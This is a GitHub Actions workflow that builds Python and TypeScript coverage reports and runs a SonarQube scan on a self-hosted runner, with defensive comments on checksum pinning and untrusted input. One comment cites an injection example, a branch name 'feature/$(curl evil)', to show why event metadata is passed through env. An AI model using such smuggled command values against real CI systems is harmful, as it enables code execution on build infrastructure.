name: vanadium-sonar

on:
  pull_request:
    branches: [ main ]
  push:
    branches: [ main ]

permissions:
  contents: read

jobs:
  sonar:
    runs-on: self-hosted
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Generate Python coverage (pytest-cov → lcov)
        # Plan 8261643: produce coverage/python.lcov for sonar.python.coverage.reportPaths.
        # Uses the mesh-test suite (proven in CI, no live DB, fast) plus the absorb
        # emitter tests (also DB-free). Both run green without external services.
        # NOTE: self-hosted runner is PEP 668 externally-managed — pip install needs
        # --break-system-packages (ubuntu-latest runners used by mesh-pytest do not).
        # Only installs if pytest-cov is missing; failures are non-fatal.
        run: |
          python3 -c "import pytest_cov" 2>/dev/null || python3 -m pip install --break-system-packages -r requirements-dev.txt || true
          mkdir -p coverage
          python3 -m pytest bin/tests/test_mesh_register_probe.py python/absorb/tests/test_emitter.py \
            --cov=bin --cov=python/absorb/absorb \
            --cov-report=lcov:coverage/python.lcov \
            --cov-report=term-missing -q || echo "coverage/python.lcov generation attempted (see log)"

      - name: Generate TypeScript coverage (vitest → lcov)
        # Plan 8261643: produce coverage/ts.lcov for sonar.javascript.lcov.reportPaths.
        # Runs the DB-free conduit-mcp unit tests (compile-verdict, compile-identity)
        # with the v8 coverage provider. Requires node + the service's node_modules;
        # installs @vitest/coverage-v8 in CI only (not committed to package.json)
        # so the service's declared deps are untouched. Failures are non-fatal
        # (the scanner skips absent reports; the gate measures 0 for that language).
        run: |
          mkdir -p coverage
          cd typescript/conduit-mcp
          if [ ! -d node_modules ]; then npm ci --no-audit --no-fund || npm install --no-audit --no-fund || true; fi
          npm install --no-save --no-audit --no-fund @vitest/coverage-v8 || true
          npx vitest run src/compile-verdict.test.ts src/compile-identity.test.ts \
            --coverage.enabled --coverage.provider=v8 \
            --coverage.reportsDirectory=../../coverage/ts-raw \
            --coverage.reporter=lcovonly || echo "TS coverage generation attempted (see log)"
          cd ../.. || true
          if [ -f coverage/ts-raw/lcov.info ]; then mv coverage/ts-raw/lcov.info coverage/ts.lcov; fi
          true

      - name: Install sonar-scanner
        env:
          # Pinned digest for sonar-scanner-cli-8.1.0.6389-linux-x64.zip
          # (published by SonarSource at the .sha256 sibling URL; verified by
          # architect on 2026-08-27). If SonarSource republishes the artifact
          # this fails loudly instead of executing unknown code on the
          # self-hosted runner.
          SONAR_SCANNER_ZIP_SHA256: bb8f709f9cb73352f8d1260a3b3c506c0f41146754bc630762c126d795499d0b
        run: |
          if [ ! -x "$HOME/bin/sonar-scanner" ]; then
            curl -sL https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-8.1.0.6389-linux-x64.zip -o /tmp/sonar.zip
            echo "$SONAR_SCANNER_ZIP_SHA256  /tmp/sonar.zip" | sha256sum -c -
            unzip -qo /tmp/sonar.zip -d "$HOME/sonar-scanner"
            mkdir -p "$HOME/bin"
            ln -sf "$HOME/sonar-scanner/sonar-scanner-8.1.0.6389-linux-x64/bin/sonar-scanner" "$HOME/bin/sonar-scanner"
          fi
          "$HOME/bin/sonar-scanner" --version

      - name: SonarQube scan (vanadium CI)
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
          # Event metadata (untrusted input) must enter the script via env,
          # never via ${{ }} interpolation in shell source — a PR branch
          # containing shell syntax (e.g. feature/$(curl evil)) would
          # otherwise execute on the self-hosted runner. Greptile P0.
          # NOTE: no sonar.pullrequest.* args. The vanadium server runs
          # Community Edition, which rejects PR-analysis properties at
          # validation before any analysis occurs (observed on PR #57 and
          # #58). Scan runs in plain project mode; sonar-project.properties
          # governs scope; the quality gate still enforces
          # (sonar.qualitygate.wait=true).
        run: |
          # SONAR_TOKEN env var is honored by the scanner; do not also pass
          # -Dsonar.login (duplicate-token warning).
          "$HOME/bin/sonar-scanner" \
            -Dsonar.host.url="$SONAR_HOST_URL" \
            -Dsonar.projectKey=nexus \
            -Dsonar.projectBaseDir="$GITHUB_WORKSPACE" \
            -Dsonar.qualitygate.wait=true \
            -Dsonar.qualitygate.timeout=600
